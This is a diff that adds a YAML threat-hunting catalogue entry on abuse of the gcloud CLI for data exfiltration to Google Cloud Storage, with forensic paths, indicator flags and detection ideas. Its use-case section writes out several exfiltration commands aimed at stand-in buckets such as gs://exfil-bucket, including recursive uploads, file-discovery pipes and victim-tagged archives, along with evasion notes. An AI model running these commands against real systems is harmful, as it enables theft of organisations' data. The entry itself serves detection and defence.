@@ -1,0 +1,189 @@
+Name: gcloud CLI
+Aliases:
+  - gcloud
+  - gcloud.py
+Description: >
+  The gcloud CLI is the official first-party command-line interface for Google Cloud Platform (GCP), designed to manage
+  all GCP services and resources. Similar to the AWS CLI and Microsof Azure's azcopy, threat actors can abuse gcloud to exfiltrate
+  data from compromised endpoints to attacker-controlled Google Cloud Storage (GCS) buckets. This behavior maps to
+  Mitre ATT&CK Technique T1567.002 (Exfiltration to Cloud Storage). The tool supports Windows, macOS, and Linux platforms
+  and provides extensive functionality for interacting with GCS, including recursive uploads, compression, encryption,
+  and manifest-based transfers. Its legitimate administrative use makes detection challenging without proper behavioral
+  analysis and telemetry correlation.
+Category: cloud-based
+Platform:
+  - Linux
+  - Windows
+  - macOS
+Execution:
+  - cli
+Capabilities:
+  - background-execution    # Can run non-interactively via scripts or automation.
+  - cloud-sync              # Core functionality: sync and transfer data to/from Google Cloud Storage.
+  - compression-support     # Supports gzip compression in-flight and locally to reduce bandwidth.
+  - credentialed-upload     # Requires GCP authentication via service accounts, user credentials, or API keys.
+  - custom-metadata         # Allows attaching custom metadata to uploaded objects for tracking or C2 communication.
+  - encrypted-transfer      # Supports client-side encryption with custom keys.
+  - multi-cloud-transfer    # --daisy-chain enables direct transfers between cloud providers without local download.
+  - proxy-aware             # Respects system proxy settings for network traffic routing.
+  - recursive-upload        # --recursive flag enables full directory tree uploads.
+  - selective-upload        # Can filter files using manifest files or stdin input.
+  - silent-execution        # Can suppress output for stealthy execution.
+Forensics:
+  BinaryLocations:
+    - C:\Program Files (x86)\Google\Cloud SDK\google-cloud-sdk\bin\gcloud.py
+    - C:\Users\<username>\AppData\Local\Google\Cloud SDK\google-cloud-sdk\bin\gcloud.py
+    - /opt/google-cloud-sdk/bin/gcloud
+    - /usr/lib/google-cloud-sdk/bin/gcloud
+    - /usr/local/bin/gcloud
+    - ~/.local/share/google-cloud-sdk/bin/gcloud
+  FileNamePatterns:
+    - gcloud
+    - gcloud.cmd
+    - gcloud.py
+    - python.exe              # gcloud is Python-based, often appears as python.exe in telemetry
+    - python3.exe
+  CommandLineArgs:
+    Description: >
+      These command-line arguments are commonly used by threat actors when leveraging gcloud for data exfiltration
+      to Google Cloud Storage. The storage cp command is the primary vector, with various options enabling stealthy,
+      efficient, and comprehensive data theft.
+    Indicators:
+      - -A                    # Short form of --all-versions.
+      - -D                    # Short form of --daisy-chain.
+      - -I                    # Short form of --read-paths-from-stdin.
+      - -L                    # Short form of --manifest-path.
+      - -R                    # Alternate recursive flag.
+      - -r                    # Short form of --recursive.
+      - --additional-headers  # Add custom HTTP headers for covert channel communication or campaign tagging.
+      - --all-versions        # Copy all versions of objects, potentially exposing historical sensitive data.
+      - --custom-metadata     # Attach custom metadata for tracking or embedding C2 information.
+      - --daisy-chain         # Stream data directly between cloud providers without local download.
+      - --decryption-keys     # Decrypt data using specified keys.
+      - --encryption-key      # Encrypt data with attacker-controlled key before upload.
+      - --gzip-in-flight      # Compress data during transfer to reduce bandwidth and evade volume-based detection.
+      - --gzip-in-flight-all  # Compress all files in transit.
+      - --gzip-local          # Compress locally before upload.
+      - --gzip-local-all      # Compress all files locally before upload.
+      - --manifest-path       # Use manifest file to specify targeted file lists for comprehensive exfiltration.
+      - --read-paths-from-stdin # Read file paths from stdin for dynamic, scripted exfiltration.
+      - --recursive           # Copy entire directory trees including subdirectories.
+      - gs://                 # GCS bucket URI scheme indicating cloud storage destination.
+      - storage cp            # Primary command for copying files to/from GCS buckets.
+  ConfigFiles:
+    - C:\Users\<username>\AppData\Roaming\gcloud\application_default_credentials.json
+    - C:\Users\<username>\AppData\Roaming\gcloud\configurations\config_default
+    - C:\Users\<username>\AppData\Roaming\gcloud\credentials.db
+    - ~/.config/gcloud/application_default_credentials.json
+    - ~/.config/gcloud/configurations/config_default
+    - ~/.config/gcloud/credentials.db
+  RegistryPersistence: []
+  LogFiles:
+    - C:\Users\<username>\AppData\Roaming\gcloud\logs\
+    - ~/.config/gcloud/logs/
+  NetworkArtifacts:
+    Description: >
+      gcloud generates HTTPS traffic to Google Cloud Storage APIs. In endpoint telemetry (NVM), gcloud appears as
+      python.exe with the gcloud.py script path in command-line arguments. Network telemetry includes byte counts,
+      source/destination IPs, but hostname reporting can be inconsistent (sometimes dl.google.com or storage.googleapis.com,
+      often blank). Detection should focus on process path + arguments combined with large outbound transfers.
+    Indicators:
+      - storage.googleapis.com
+      - www.googleapis.com
+      - dl.google.com
+      - '*.storage.googleapis.com'
+  ScheduledTask:
+    - Name: Automated GCS Upload
+      Description: >
+        gcloud can be automated via cron jobs (Linux/macOS) or Windows Task Scheduler for periodic exfiltration.
+        Threat actors may schedule regular data collection and upload operations to continuously exfiltrate data
+        over extended periods.
+      Command: 'gcloud storage cp C:\Data\ gs://exfil-bucket/ --recursive'
+ThreatActors: []
+UseCases:
+  - Title: Basic File Upload to GCS
+    Description: >
+      Simple file copy from local file system to a GCS bucket. This is the most straightforward exfiltration method
+      using gcloud.
+    Command: |
+      gcloud storage cp .\500MBtestfile.bin gs://exfiltest/testfile.bin
+  - Title: Recursive Directory Upload
+    Description: >
+      Upload an entire directory tree to GCS, including all subdirectories and files. Common in bulk data exfiltration
+      scenarios where threat actors want to capture entire document repositories or user directories.
+    Command: |
+      gcloud storage cp C:\Users\Administrator\Documents gs://exfil-bucket/documents/ --recursive
+  - Title: Compressed Transfer to Reduce Bandwidth
+    Description: >
+      Compress files during transfer using gzip to reduce network traffic volume and potentially evade volume-based
+      detection thresholds.
+    Command: |
+      gcloud storage cp /data/ gs://exfil-bucket/compressed/ --recursive --gzip-in-flight-all
+  - Title: All Versions Exfiltration
+    Description: >
+      Copy all historical versions of files from a versioned GCS bucket, potentially exposing older, unredacted,
+      or previously deleted sensitive information.
+    Command: |
+      gcloud storage cp gs://source-bucket/ gs://exfil-bucket/ --all-versions --recursive
+  - Title: Encrypted Upload with Custom Key
+    Description: >
+      Encrypt files with an attacker-controlled encryption key before uploading to GCS, ensuring that even if the
+      data is discovered, it remains unreadable without the attacker's decryption key.
+    Command: |
+      gcloud storage cp C:\Sensitive\ gs://encrypted-exfil/ --recursive --encryption-key=<base64-key>
+  - Title: Manifest-Based Targeted Exfiltration
+    Description: >
+      Use a pre-defined manifest file containing paths to specific high-value targets (e.g., database dumps,
+      credential files, intellectual property) for comprehensive and targeted exfiltration.
+    Command: |
+      gcloud storage cp --manifest-path=targets.txt gs://exfil-bucket/
+  - Title: Dynamic File Discovery and Upload
+    Description: >
+      Pipe the output of a file discovery command (e.g., find) directly into gcloud to dynamically identify and
+      exfiltrate sensitive files based on name patterns or content.
+    Command: |
+      find . -name "*confidential*" -o -name "*secret*" | gcloud storage cp -I gs://exfil-bucket/
+  - Title: Custom Headers for Covert Communication
+    Description: >
+      Embed custom HTTP headers in upload requests to tag exfiltrated data with campaign identifiers, victim metadata,
+      or covert C2 communication channels.
+    Command: |
+      gcloud storage cp sensitive.zip gs://exfil-bucket/ --additional-headers=X-Campaign-ID:OP2024,X-Victim:TARGET01
+  - Title: Custom Metadata Tagging
+    Description: >
+      Attach custom metadata key-value pairs to uploaded objects for attacker tracking, victim identification,
+      or embedding disguised information.
+    Command: |
+      gcloud storage cp data.tar.gz gs://exfil-bucket/ --custom-metadata=victim=finance-dept,campaign=q4-2024
+Detection:
+  - Type: Informational Event for Large File Transfer
+    Description: >
+      Create an informational-level alert for gcloud storage cp usage combined with network telemetry showing
+      large outbound data transfers (bytes out > bytes in). While not inherently malicious, this provides baseline
+      visibility into cloud storage uploads. Volume analysis shows only 7 gcloud storage cp events in a 1-week
+      period of 2.8 billion EVM Process Activity events, making this viable for monitoring. Combine with other
+      behavioral indicators for higher-confidence detections.
+  - Type: Unusual Parent Process
+    Description: >
+      Detect gcloud (python.exe with gcloud.py) execution from uncommon parent processes such as mshta.exe,
+      wmic.exe, powershell.exe, cmd.exe spawned by Office applications, or other LOLBins. This may indicate
+      abuse through malware loaders or scripted exfiltration.
+  - Type: Compression + Large Transfer
+    Description: >
+      Correlate gcloud usage with compression flags (--gzip-*) and large outbound network transfers. Compression
+      significantly reduces transfer volume and time, making exfiltration faster and potentially less noticeable.
+  - Type: Scheduled Task or Cron Job
+    Description: >
+      Monitor for creation of scheduled tasks (Windows) or cron jobs (Linux/macOS) that execute gcloud storage cp
+      commands. Automated, recurring exfiltration is a strong indicator of persistent data theft operations.
+References:
+  - https://attack.mitre.org/techniques/T1567/002/
+  - https://attack.mitre.org/techniques/T1059/006/
+  - https://docs.cloud.google.com/storage/docs/discover-object-storage-gcloud
+  - https://cloud.google.com/sdk/gcloud/reference/storage/cp
+  - https://www.mitiga.io/blog/google-cloud-platform-exfiltration-a-threat-hunting-guide
+  - https://github.com/cisco-sbg/Xfiletrator/blob/main/yml/azcopy.yml
+  - https://github.com/cisco-sbg/Xfiletrator/blob/main/yml/awscli.yml
+  - https://github.com/cisco-sbg/tdr-sigma-rules/pull/143
+  - https://github.com/cisco-sbg/tdr-sigma-rules/pull/149
+LastModified: '2025-12-08'
